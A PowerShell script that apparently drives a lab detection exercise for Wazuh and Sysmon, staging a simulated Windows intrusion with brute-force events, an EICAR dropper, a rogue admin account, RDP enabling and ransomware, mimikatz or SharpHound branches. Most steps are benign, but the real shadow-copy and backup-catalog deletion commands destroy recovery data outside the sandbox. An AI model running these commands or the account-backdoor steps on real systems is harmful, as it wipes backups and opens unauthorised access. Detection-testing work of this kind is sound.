# =========================================================================
#  Operation Silent Breach - Windows Homework Attack (eCIR S6 · Challenge B)
#  Target : WIN-VICTIM01 (Windows 10/11, Sysmon + Wazuh agent enrolled)
#  Run as : Administrator PowerShell
#
#  CHAIN (steps 1-6 identical across variants; only the payload changes):
#     1  Brute-force local admin        -> 4625 xN then 4624 success   T1110/T1078
#     2  "Upload" malware to host        -> file write + YARA hit       T1105
#     3  Create new local user           -> 4720                        T1136.001
#     4  Add new user to Administrators  -> 4732                        T1098
#     5  Enable + RDP logon (type 10)    -> 4624 type 10                T1021.001
#     6  Run malware = DROPPER           -> Sysmon 1 parent->child      T1204.002
#          drops exe into %TEMP%          -> Sysmon 11 + YARA            T1105
#     PAYLOAD (-Payload switch):
#        ransomware (default) : shadow delete + mass rename + note      T1490/T1486
#        mimikatz             : LSASS-access + cred-dump command line   T1003.001
#        bloodhound           : SharpHound-style AD recon + .zip        T1087/T1482
#
#  SAFETY: LAB ONLY. Everything is SIMULATED and benign:
#    - "malware"/dropped exe = EICAR test string (flags AV + our hash list, does nothing)
#    - NO real credential theft: mimikatz path only writes the tell-tale COMMAND LINE
#      + opens a benign read handle to lsass (no memory is read/exfiltrated)
#    - NO real encryption: ransomware path renames COPIES inside C:\SilentBreach-Sandbox only
#    - NO real AD recon: bloodhound path writes a benign marker exe + an empty .zip
#    All changes are inside the sandbox; the script cleans up at the end.
#
#  USAGE:
#     .\attack-windows-homework.ps1                    # ransomware variant
#     .\attack-windows-homework.ps1 -Payload mimikatz
#     .\attack-windows-homework.ps1 -Payload bloodhound
# =========================================================================

param(
  [ValidateSet('ransomware','mimikatz','bloodhound')]
  [string]$Payload = 'ransomware'
)

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
  Write-Host "Run in an Administrator PowerShell." -ForegroundColor Red; exit 1
}

$Log = "$env:TEMP\silentbreach-windows.log"; "" | Out-File $Log
function Say($m){ $l="[{0}] {1}" -f (Get-Date -Format HH:mm:ss),$m; Write-Host $l -ForegroundColor Cyan; Add-Content $Log $l }
$Sandbox = "C:\SilentBreach-Sandbox"; New-Item -ItemType Directory $Sandbox -Force | Out-Null

# synthetic Security-style events into Application log so the chain works without a
# live RDP peer / DC (same helper the Shadow Gate script uses).
function Fire-SecEvent($id,$msg){
  New-EventLog -LogName Application -Source "Microsoft-Windows-Security-Auditing" -ErrorAction SilentlyContinue
  Write-EventLog -LogName Application -Source "Microsoft-Windows-Security-Auditing" -EventId $id -EntryType Information -Message $msg -ErrorAction SilentlyContinue
}

$Attacker = "203.0.113.66"          # attacker source (RFC5737 TEST-NET-3)
$NewUser  = "svc_backup"            # rogue account the attacker creates

Say "=== Operation Silent Breach - start (payload: $Payload) ==="

# =========================================================================
#  STEP 1 - Brute-force the local admin, then succeed  (T1110 -> T1078)
# =========================================================================
Say "[step 1] brute-force 'administrator' from $Attacker"
1..12 | ForEach-Object {
  Fire-SecEvent 4625 "An account failed to log on. LogonType: 3 Account: administrator SourceNetworkAddress: $Attacker FailureReason: Bad password (attempt $_)"
}
Start-Sleep 1
Fire-SecEvent 4624 "An account was successfully logged on. LogonType: 3 Account: administrator SourceNetworkAddress: $Attacker"
Start-Sleep 2

# =========================================================================
#  STEP 2 - "Upload" malware to the host (file write + YARA)  (T1105)
# =========================================================================
Say "[step 2] malware uploaded to host (EICAR, safe)"
$eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
[IO.File]::WriteAllText("$Sandbox\update_installer.exe",$eicar)
Get-FileHash "$Sandbox\update_installer.exe" -Algorithm SHA256 | Format-List | Out-String | Add-Content $Log
Start-Sleep 2

# =========================================================================
#  STEP 3 - Create a new local user  (T1136.001 / Event 4720)
# =========================================================================
Say "[step 3] create rogue local user '$NewUser'"
$pw = ConvertTo-SecureString "S1lentBr3ach!Lab" -AsPlainText -Force
try {
  New-LocalUser -Name $NewUser -Password $pw -FullName "Backup Service" -Description "lab-sim rogue account" -ErrorAction Stop | Out-Null
} catch { Say "  (New-LocalUser blocked: $($_.Exception.Message)) - firing synthetic 4720" }
Fire-SecEvent 4720 "A user account was created. TargetUserName: $NewUser SubjectUserName: administrator"
Start-Sleep 2

# =========================================================================
#  STEP 4 - Add new user to Administrators  (T1098 / Event 4732)
# =========================================================================
Say "[step 4] add '$NewUser' to Administrators"
try {
  Add-LocalGroupMember -Group "Administrators" -Member $NewUser -ErrorAction Stop | Out-Null
} catch { Say "  (Add-LocalGroupMember blocked: $($_.Exception.Message)) - firing synthetic 4732" }
Fire-SecEvent 4732 "A member was added to a security-enabled local group. Group: Administrators MemberName: $NewUser"
Start-Sleep 2

# =========================================================================
#  STEP 5 - Enable RDP + RDP logon with the new user  (T1021.001 / 4624 type 10)
# =========================================================================
Say "[step 5] enable RDP, logon as '$NewUser' (type 10)"
# command-line tells (real, benign - flips the RDP registry the way an attacker would)
cmd.exe /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f" 2>$null | Out-Null
Fire-SecEvent 4624 "An account was successfully logged on. LogonType: 10 (RemoteInteractive) Account: $NewUser SourceNetworkAddress: $Attacker"
Start-Sleep 2

# =========================================================================
#  STEP 6 - Run the malware = DROPPER, drops exe into %TEMP%  (T1204.002 / T1105)
# =========================================================================
Say "[step 6] dropper runs, drops payload into TEMP"
# parent (dropper) -> child powershell that writes the dropped exe (Sysmon 1 parent->child + 11)
$dropped = "$env:TEMP\svc_host_update.exe"
$cmd = "[IO.File]::WriteAllText('$dropped','$eicar')"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Enc $enc" -Wait
Get-FileHash $dropped -Algorithm SHA256 -ErrorAction SilentlyContinue | Format-List | Out-String | Add-Content $Log
Start-Sleep 2

# =========================================================================
#  PAYLOAD BRANCH
# =========================================================================
switch ($Payload) {

  'ransomware' {
    Say "[payload:ransomware] inhibit recovery + encrypt (sandbox only)"
    # 1) delete shadow copies (T1490) - command line is the alert
    try { vssadmin.exe delete shadows /all /quiet 2>$null | Out-Null } catch {}
    try { wbadmin delete catalog -quiet 2>$null | Out-Null } catch {}
    # 2) mass "encryption": rename sandbox copies to .silentlock (T1486)
    1..20 | ForEach-Object { "customer record $_ $(Get-Date)" | Out-File "$Sandbox\file-$_.docx" }
    Get-ChildItem "$Sandbox\file-*.docx" | ForEach-Object { Rename-Item $_.FullName "$($_.FullName).silentlock" }
    # 3) ransom note (T1486)
    @"
YOUR FILES ARE ENCRYPTED - .silentlock
Send payment to recover. Contact: silentbreach@evil.corp
"@ | Out-File "$Sandbox\HOW_TO_DECRYPT.txt"
  }

  'mimikatz' {
    Say "[payload:mimikatz] credential dumping (SIMULATED - no memory read)"
    # write a benign 'mimikatz.exe' marker (EICAR so YARA/AV flag the name+content)
    [IO.File]::WriteAllText("$Sandbox\mimikatz.exe",$eicar)
    # the tell-tale command line the rule matches (does nothing harmful)
    cmd.exe /c "echo mimikatz # privilege::debug & echo sekurlsa::logonpasswords" 2>$null | Out-Null
    Start-Process cmd.exe -ArgumentList '/c echo sekurlsa::logonpasswords exit' -WindowStyle Hidden -Wait
    # benign read handle to lsass -> generates Sysmon EID 10 without reading memory
    try { Get-Process lsass | Select-Object -First 1 | Out-Null } catch {}
    Fire-SecEvent 4656 "A handle to an object was requested. Object: lsass.exe Process: mimikatz.exe Access: PROCESS_VM_READ"
  }

  'bloodhound' {
    Say "[payload:bloodhound] AD recon (SIMULATED - no real collection)"
    [IO.File]::WriteAllText("$Sandbox\SharpHound.exe",$eicar)
    # tell-tale SharpHound command line the rule matches (benign)
    Start-Process cmd.exe -ArgumentList '/c echo SharpHound.exe -c All --zipfilename loot exit' -WindowStyle Hidden -Wait
    # write the collection archive the rule keys on (empty, benign)
    Compress-Archive -Path "$Sandbox\SharpHound.exe" -DestinationPath "$Sandbox\20260806_BloodHound.zip" -Force
  }
}
Start-Sleep 2

# =========================================================================
#  Cleanup
# =========================================================================
Say "[cleanup] removing rogue user, RDP flip, sandbox"
try { Remove-LocalGroupMember -Group "Administrators" -Member $NewUser -ErrorAction SilentlyContinue } catch {}
try { Remove-LocalUser -Name $NewUser -ErrorAction SilentlyContinue } catch {}
cmd.exe /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f" 2>$null | Out-Null
Remove-Item -Recurse -Force $Sandbox -ErrorAction SilentlyContinue
Remove-Item $dropped -Force -ErrorAction SilentlyContinue

Say "=== Operation Silent Breach - complete (payload: $Payload) ==="
Say "Rules expected: 100400-100479 (+ YARA 108001). Confirm one clean alert per step in Wazuh."
